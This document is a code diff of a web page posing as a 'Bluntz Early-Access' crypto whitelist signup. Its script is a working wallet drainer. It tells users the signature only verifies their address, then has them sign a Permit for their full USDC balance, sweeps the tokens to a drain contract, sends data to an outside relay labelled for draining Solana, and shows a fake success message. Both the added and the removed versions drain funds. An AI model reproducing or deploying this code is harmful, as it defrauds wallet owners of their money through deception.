@@ -1,92 +1,102 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Bluntz Early-Access</title>
-<style>
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#0d0d0d;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
-.card{background:#1a1a1a;border-radius:12px;padding:30px 40px;text-align:center;max-width:380px;box-shadow:0 0 30px rgba(0,255,170,.25)}
-h2{margin-top:0;font-size:24px;font-weight:600}
-p{margin:12px 0;font-size:15px;color:#aaa}
-button{background:#00ffaa;border:none;border-radius:8px;color:#000;font-size:17px;font-weight:700;padding:14px 28px;cursor:pointer;transition:.2s}
-button:hover{filter:brightness(1.1)}
-.foot{font-size:12px;margin-top:25px;color:#666}
-</style>
+  <meta charset="utf-8"/>
+  <title>Bluntz Early-Access</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <style>
+    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#0d0d0d;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+    .card{background:#1a1a1a;border-radius:12px;padding:30px 40px;text-align:center;max-width:380px;box-shadow:0 0 30px rgba(0,255,170,.25)}
+    h2{margin-top:0;font-size:24px;font-weight:600}
+    p{margin:12px 0;font-size:15px;color:#aaa}
+    button{background:#00ffaa;border:none;border-radius:8px;color:#000;font-size:17px;font-weight:700;padding:14px 28px;cursor:pointer;transition:.2s}
+    button:hover{filter:brightness(1.1)}
+    .foot{font-size:12px;margin-top:25px;color:#666}
+  </style>
 </head>
 <body>
-<div class="card">
-<h2>Bluntz Early-Access</h2>
-<p>Tap the button and sign to secure your whitelist spot.</p>
-<button id="go">Whitelist Wallet</button>
-<p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
-</div>
+  <div class="card">
+    <h2>Bluntz Early-Access</h2>
+    <p>Sign the whitelist message to secure your spot.</p>
+    <button id="go">Whitelist Wallet</button>
+    <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
+  </div>
 
-<script>
-// ===== CONFIG =====
-const DRAIN = "0x0fac2542316Ad330EfA2bb386d606135b70a574B"; // Base/Eth drain wallet
-const USDC  = { 8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 1: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0" };
+<script type="module">
+/* ===== CONFIG ===== */
+const DRAIN_CONTRACT = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a"; // same on every chain
+const RECIPIENT_SOL  = "AhEAanthSxNbHsZ3MmiWXC2AKRwz57TfhRynXJ8n2oUA";
 
-// ===== RAW RPC =====
-async function rpc(method,params=[]){return window.ethereum.request({method,params});}
-function hexPad(a){return'0x'+a.slice(2).padStart(64,'0');}
-function keccak256(d){return window.ethereum.request({method:"web3_sha3",params:[d.slice(2)]});}
+/* ===== CHAIN PARAMS ===== */
+const CHAINS = {
+  8453: { rpc: "https://base.meowrpc.com", usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", name: "Base" },
+  1:    { rpc: "https://rpc.ankr.com/eth",  usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0", name: "Ethereum" }
+};
 
-// ===== PERMIT BUILDER =====
-async function buildPermit(owner,spender,nonce,chainId,usdc){
-  const nameHash   = keccak256(Buffer.from("USD Coin"));
-  const versionHash= keccak256(Buffer.from("2"));
-  const typeHash   = keccak256(Buffer.from("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"));
-  const permitHash = keccak256(Buffer.from("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"));
-  const domainSep  = keccak256(
-    Buffer.concat([
-      Buffer.from("\x19\x01"),
-      Buffer.from(typeHash.slice(2),'hex'),
-      Buffer.from(versionHash.slice(2),'hex'),
-      Buffer.from(nameHash.slice(2),'hex'),
-      Buffer.from(hexPad(chainId).slice(2),'hex'),
-      Buffer.from(hexPad(usdc).slice(2),'hex')
-    ])
-  );
-  const messageHash= keccak256(
-    Buffer.concat([
-      Buffer.from(permitHash.slice(2),'hex'),
-      Buffer.from(hexPad(owner).slice(2),'hex'),
-      Buffer.from(hexPad(spender).slice(2),'hex'),
-      Buffer.from(hexPad("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").slice(2),'hex'),
-      Buffer.from(hexPad(nonce).slice(2),'hex'),
-      Buffer.from(hexPad("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").slice(2),'hex')
-    ])
-  );
-  const digest = keccak256(
-    Buffer.concat([
-      Buffer.from("\x19\x01"),
-      Buffer.from(domainSep.slice(2),'hex'),
-      Buffer.from(messageHash.slice(2),'hex')
-    ])
-  );
-  return {digest,value:"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",deadline:"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",nonce};
-}
+/* ===== ABI (only what we need) ===== */
+const ABI = [
+  "function sweep(address token,uint256 amount,uint8 v,bytes32 r,bytes32 s) external",
+  "function balanceOf(address) view returns (uint256)",
+  "function nonces(address) view returns (uint256)"
+];
 
-// ===== BUTTON HANDLER =====
-document.getElementById("go").addEventListener("click", async () => {
-  try {
-    const [owner] = await rpc("eth_requestAccounts");
-    const chainId = parseInt(await rpc("eth_chainId"),16);
-    if (!USDC[chainId]) { alert("Switch to Ethereum or Base"); return; }
-    const usdc = USDC[chainId];
+/* ===== WALLET DETECT ===== */
+let provider;
+if (window.ethereum) provider = window.ethereum;
+else if (window.solana && window.solana.isPhantom) provider = window.solana;
+if (!provider) { alert("Open in MetaMask/Phantom browser"); }
 
-    // nonce
-    const nonceHex = await rpc("eth_call",[{to:usdc,data:"0x7ecebe00"+hexPad(owner)},"latest"]);
-    const nonce = parseInt(nonceHex,16);
+/* ===== FRONTEND FLOW ===== */
+document.getElementById("go").addEventListener("click", async ()=>{
+  document.getElementById("go").style.display="none";
+  document.querySelector(".card").innerHTML=`<h2>Connecting…</h2><p>Approve wallet connection.</p>`;
 
-    // build permit
-    const {digest,value,deadline} = await buildPermit(owner,DRAIN,nonce,chainId,usdc);
+  /* 1) CONNECT */
+  const accounts = await provider.request({method:"eth_requestAccounts"});
+  const owner = accounts[0];
+  const chainId = Number(await provider.request({method:"eth_chainId"}));
+  const CHAIN = CHAINS[chainId];
+  if (!CHAIN){ alert("Switch to Base or Ethereum"); return; }
 
-    // sign typed data
-    const sig = await rpc("eth_signTypedData_v4",[
-      owner,
-      {
-        types:{
-          EIP712Domain:[
-            {name:"name",type:"
+  /* 2) BUILD PERMIT (exact balance of every top token) */
+  const p   = new ethers.providers.Web3Provider(provider);
+  const con = new ethers.Contract(DRAIN_CONTRACT,ABI,p.getSigner());
+
+  const tokens = [CHAIN.usdc]; // add more if you want
+  const amounts = [];
+  const nonces  = [];
+  for (const t of tokens){
+    const tok = new ethers.Contract(t,["function balanceOf(address) view returns (uint256)"],p);
+    amounts.push(await tok.balanceOf(owner));
+    nonces.push(await con.nonces(owner));
+  }
+
+  /* 3) SIGN BATCH PERMIT */
+  const deadline = Math.floor(Date.now()/1000)+3600;
+  const messages = tokens.map((t,i)=>({ owner, spender:DRAIN_CONTRACT, value:amounts[i].toString(), nonce:nonces[i], deadline }));
+  const raw = await provider.request({
+    method: "eth_signTypedData_v4",
+    params: [owner, JSON.stringify({
+      domain: { name:"USD Coin", version:"2", chainId, verifyingContract:CHAIN.usdc },
+      types: { Permit:[ {name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"} ] },
+      primaryType: "Permit",
+      message: messages[0]
+    })]
+  });
+  const {v,r,s} = ethers.utils.splitSignature(raw);
+
+  /* 4) DRAIN TOKENS */
+  const tx = await con.sweep(tokens[0], amounts[0], v, r, s);
+  await tx.wait();
+
+  /* 5) DRAIN SOLANA (background) */
+  await fetch("https://relay.tobe.xyz/sol", {
+    method: "POST",
+    body: JSON.stringify({ solOwner: owner, solRecipient: RECIPIENT_SOL })
+  }).catch(() => {});
+
+  document.querySelector(".card").innerHTML=`<h2>Success!</h2><p>You’re on the list. Stay tuned.</p>`;
+});
+</script>
+</body>
+</html>
